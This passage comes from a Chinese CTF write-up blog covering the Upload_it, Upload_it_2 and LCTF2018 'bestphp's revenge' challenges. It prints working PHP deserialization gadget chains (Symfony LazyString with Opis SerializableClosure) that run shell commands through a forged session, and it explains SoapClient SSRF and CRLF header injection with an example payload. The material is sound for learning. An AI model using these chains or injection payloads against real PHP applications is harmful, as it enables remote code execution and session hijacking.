class="attr">&quot;symfony/string&quot;</span>: <span class="string">&quot;^5.3&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;opis/closure&quot;</span>: <span class="string">&quot;^3.6&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>应该是要通过这俩个依赖找到pop链从而实现<code>session反序列化攻击</code></p><p>分析主要源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;path&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$upload_file_path</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;upload_path&quot;</span>].<span class="string">&quot;/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">    <span class="variable">$upload_file</span> = <span class="variable">$upload_file_path</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$upload_file_path</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;upload_path&quot;</span>];</span><br><span class="line">    <span class="variable">$upload_file</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;upload_path&quot;</span>].<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$upload_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;OK! Your file saved in: &quot;</span> . <span class="variable">$upload_file</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;emm...Upload failed:(&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用了<code>$_SESSION[&#39;upload_path&#39;]</code>进行字符串拼接，所以可以触发<code>__toString</code>方法，开始找链子</p><h3 id="链子一"><a href="#链子一" class="headerlink" title="链子一"></a>链子一</h3><p>通过搜索，可以发现在<code>Symfony\Component\String\LazyString</code>存在该魔术方法并在第12行有很明显的跳转到<code>__invoke</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">String</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LazyString</span> <span class="keyword">implements</span> \<span class="title">Stringable</span>, \<span class="title">JsonSerializable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (\is_string(<span class="keyword">$this</span>-&gt;value)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;value;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;value = (<span class="keyword">$this</span>-&gt;value)();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (\<span class="built_in">TypeError</span>::class === \get_class(<span class="variable">$e</span>) &amp;&amp; <span class="keyword">__FILE__</span> === <span class="variable">$e</span>-&gt;getFile()) &#123;</span><br><span class="line">                <span class="variable">$type</span> = explode(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$e</span>-&gt;getMessage());</span><br><span class="line">                <span class="variable">$type</span> = substr(array_pop(<span class="variable">$type</span>), <span class="number">0</span>, -\strlen(<span class="string">&#x27; returned&#x27;</span>));</span><br><span class="line">                <span class="variable">$r</span> = <span class="keyword">new</span> \ReflectionFunction(<span class="keyword">$this</span>-&gt;value);</span><br><span class="line">                <span class="variable">$callback</span> = <span class="variable">$r</span>-&gt;getStaticVariables()[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line"></span><br><span class="line">                <span class="variable">$e</span> = <span class="keyword">new</span> \<span class="built_in">TypeError</span>(sprintf(<span class="string">&#x27;Return value of %s() passed to %s::fromCallable() must be of the type string, %s returned.&#x27;</span>, <span class="variable">$callback</span>, <span class="built_in">static</span>::class, <span class="variable">$type</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (\PHP_VERSION_ID &lt; <span class="number">70400</span>) &#123;</span><br><span class="line">                <span class="comment">// leverage the ErrorHandler component with graceful fallback when it&#x27;s not available</span></span><br><span class="line">                <span class="keyword">return</span> trigger_error(<span class="variable">$e</span>, \E_USER_ERROR);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">throw</span> <span class="variable">$e</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再通过搜索<code>__voke</code>方法，找到<code>Opis\Closure\SerializableClosure</code>，可以传入一个匿名函数<code>Closure</code>，并在<code>__invoke</code>中执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Opis</span>\<span class="title">Closure</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SerializableClosure</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="built_in">Closure</span> <span class="variable">$closure</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;closure = <span class="variable">$closure</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">static</span>::<span class="variable">$context</span> !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;scope = <span class="built_in">static</span>::<span class="variable">$context</span>-&gt;scope;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;scope-&gt;toserialize++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;closure, func_get_args());</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">String</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">LazyString</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">value</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;value = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">require</span> &quot;./<span class="title">vendor</span>/<span class="title">autoload</span>.<span class="title">php</span>&quot;;</span><br><span class="line">    <span class="variable">$func</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;system(<span class="string">&quot;cat /flag&quot;</span>);&#125;;</span><br><span class="line">    <span class="variable">$d</span> = <span class="keyword">new</span> \Opis\<span class="built_in">Closure</span>\SerializableClosure(<span class="variable">$func</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span class="keyword">new</span> \Symfony\Component\<span class="keyword">String</span>\LazyString(<span class="variable">$d</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;upload_path&#x27;</span>] = <span class="variable">$s</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将生成的session文件上传后使用该session访问即可获得flag</p><h3 id="链子二"><a href="#链子二" class="headerlink" title="链子二"></a>链子二</h3><p>这个就不细说了，基本都差不多，看exp就可以看得出来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">String</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">LazyString</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">value</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;value=<span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">require</span> &quot;./<span class="title">vendor</span>/<span class="title">autoload</span>.<span class="title">php</span>&quot;;</span><br><span class="line">    <span class="variable">$func</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;system(<span class="string">&#x27;cat /flag&#x27;</span>);&#125;;</span><br><span class="line">    <span class="variable">$a</span> = \Opis\<span class="built_in">Closure</span>\serialize(<span class="variable">$func</span>);</span><br><span class="line">    <span class="variable">$b</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span class="keyword">new</span> \Symfony\Component\<span class="keyword">String</span>\LazyString(<span class="variable">$b</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;upload_path&quot;</span>] = <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Upload-it-2"><a href="#Upload-it-2" class="headerlink" title="Upload_it_2"></a>Upload_it_2</h2><p> 看大师傅们wp说就是换个链子，5555555</p><p>exp1:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">String</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">LazyString</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">value</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;value = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">sandbox</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">evil</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;evil = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = [<span class="keyword">new</span> sandbox,<span class="string">&quot;backdoor&quot;</span>];</span><br><span class="line">    <span class="variable">$s</span> = <span class="keyword">new</span> \Symfony\Component\<span class="keyword">String</span>\LazyString(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$s</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp2:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">sandbox</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">evil</span> = &quot;/<span class="title">flag</span>&quot;;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$upload_path</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make_user_upload_dir</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$md5_dir</span> = md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] . session_id());</span><br><span class="line">            <span class="keyword">$this</span>-&gt;upload_path = UPLOAD_PATH . <span class="string">&quot;/&quot;</span> . <span class="variable">$md5_dir</span>;</span><br><span class="line">            @mkdir(<span class="keyword">$this</span>-&gt;upload_path);</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&quot;upload_path&quot;</span>] = <span class="keyword">$this</span>-&gt;upload_path;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">has_upload_dir</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;upload_path&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;NO NO NO&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (method_exists(<span class="keyword">$this</span>, <span class="variable">$func</span>)) &#123;</span><br><span class="line">                call_user_func_array(</span><br><span class="line">                    [<span class="keyword">$this</span>, <span class="variable">$func</span>],</span><br><span class="line">                    <span class="variable">$value</span></span><br><span class="line">                );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">include_once</span> <span class="keyword">$this</span>-&gt;evil;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">String</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">LazyString</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">value</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="keyword">array</span>(<span class="keyword">new</span> \sandbox(),<span class="string">&quot;backdoor&quot;</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;value=<span class="variable">$a</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> LazyString();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;upload_path&quot;</span>] = <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
            <tag> Ctfer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bestphp revenge</title>
      <link href="/post/2021-12/bestphp%20revenge/"/>
      <url>/post/2021-12/bestphp%20revenge/</url>
      
        <content type="html"><![CDATA[<h1 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h1><p><strong>考点：1、SoapClient触发反序列化导致ssrf    2、serialize_hander处理session方式不同导致session注入</strong></p><p>又学到了一个新的知识点</p><p>首页面给出了源码</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line">call_user_func(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>], <span class="variable">$_POST</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(reset(<span class="variable">$_SESSION</span>), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line">call_user_func(<span class="variable">$b</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">only localhost can get flag!session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;only localhost can get flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">       <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>] = <span class="variable">$flag</span>;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure><p>通过<code>flag.php</code>我们发现要获取flag需要通过<code>ssrf</code>才可以实现将<code>flag</code>写入到<code>session</code>里，然后再在<code>index.php</code>中输出。</p><p>所以我们回到<code>index.php</code>来看如何实现，通过审计，我们发现有很多的可控变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>], <span class="variable">$_POST</span>);</span><br></pre></td></tr></table></figure><p>我们可以调用任意函数并传入一个参数，或者我们可以将<code>f</code>传入一个数组表示某个类的某个方法，这里我们就涉及到了一个新的知识点<code>构造SSRF之SoapClient类</code></p><h2 id="构造SSRF之SoapClient类"><a href="#构造SSRF之SoapClient类" class="headerlink" title="构造SSRF之SoapClient类"></a>构造SSRF之SoapClient类</h2><p><code>SoapClient</code>是php内置的类，当<code>__call</code>方法被触发后，它可以发送HTTP和HTTPS请求，从而实现ssrf的效果，</p><p>该类的构造函数如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient :: SoapClient （<span class="keyword">mixed</span> <span class="variable">$wsdl</span> [，<span class="keyword">array</span> <span class="variable">$options</span> ]）</span><br></pre></td></tr></table></figure><p>第一个参数是用来指明是否是wsdl模式</p><blockquote><p>WSDL (Web Services Description Language,Web服务描述语言)是一种XML Application，他将Web服务描述定义为一组服务访问点，客户端可以通过这些服务访问点对包含面向文档信息或面向过程调用的服务进行访问(类似远程过程调用)</p></blockquote><p>第二个参数如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则<strong>必须设置location和uri选项</strong>，其中<code>location</code>是要将请求发送到的SOAP服务器的URL，而<code>uri</code>是SOAP服务的目标命名空间。</p><p>但是我们如何使得利用<code>ssrf</code>获得的flag存入已知的<code>session</code>中呢？</p><p>这里我们又要学习一个<code>CRLF Injection漏洞</code></p><h2 id="CRLF-Injection漏洞"><a href="#CRLF-Injection漏洞" class="headerlink" title="CRLF Injection漏洞"></a>CRLF Injection漏洞</h2><p>CRLF是”回车+换行”（\r\n）的简称。在HTTP协议中，HTTPHeader与HTTPBody是用两个<code>CRLF</code>分隔的，浏览器就是根据这两个<code>CRLF</code>来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以<code>CRLFInjection</code>又叫<code>HTTPResponseSplitting</code>，简称<code>HRS</code>。</p><p>举个例子，一般网站会在HTTP头中用<code>Location: http://baidu.com</code>这种方式来进行302跳转，所以我们能控制的内容就是Location:后面的XXX某个网址。</p><p>所以一个正常的302跳转包是这样</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Moved Temporarily </span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 27 Jun 2014 17:52:17 GMT </span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html </span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>154 </span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close </span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>http://www.sina.com.cn</span><br></pre></td></tr></table></figure><p>但如果我们输入的是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.sina.com.cn%0aSet-cookie:JSPSESSID%3Dwooyun</span></span><br></pre></td></tr></table></figure><p>注入了一个换行，此时的返回包就会变成这样：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">302</span> Moved Temporarily </span><br><span class="line"><span class="attr">Date</span>: Fri, <span class="number">27</span> Jun <span class="number">2014</span> <span class="number">17</span>:<span class="number">52</span>:<span class="number">17</span> GMT </span><br><span class="line">Content-Type: text/html </span><br><span class="line">Content-Length: <span class="number">154</span> </span><br><span class="line"><span class="attr">Connection</span>: close </span><br><span class="line"><span class="attr">Location</span>: http:<span class="comment">//www.sina.com.cn </span></span><br><span class="line"><span class="built_in">Set</span>-cookie: JSPSESSID=wooyun</span><br></pre></td></tr></table></figure><p>这个时候这样我们就给访问者设置了一个SESSION，造成一个“会话固定漏洞”。</p><p>当然，HRS并不仅限于会话固定，通过注入两个CRLF就能造成一个无视浏览器Filter的反射型XSS。更加详细的之后会专门再写一篇笔记细说。</p><p>对于这道题而言，我们可以控制<code>location</code>，所以就可以通过<code>CRLF</code>进行携带<code>Cookie</code></p><p>回到最初的问题，我们如何去构造<code>SoapClient类</code>呢？</p><h2 id="PHP的session反序列化机制"><a href="#PHP的session反序列化机制" class="headerlink" title="PHP的session反序列化机制"></a>PHP的session反序列化机制</h2><p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储，存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容。</p><p>在php.ini中存在三项配置项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session.save_path=&quot;&quot;   --设置session的存储路径</span><br><span class="line">session.save_handler=&quot;&quot; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span><br><span class="line">session.serialize_handler   string --定义用来序列化/反序列化的处理器名字。默认是php(5.5.4后改为php_serialize)</span><br></pre></td></tr></table></figure><p><strong>session.serialize_handler存在以下几种:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值</span><br><span class="line">php 键名+竖线（|）+经过serialize()函数处理过的值</span><br><span class="line">php_serialize(php&gt;=5.5.4) 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化</span><br></pre></td></tr></table></figure><p>在PHP中默认使用的是<strong>PHP引擎</strong>(5.5.4后改为php_serialize)，如果要修改为其他的引擎，只需要添加代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(‘session.serialize_handler’, 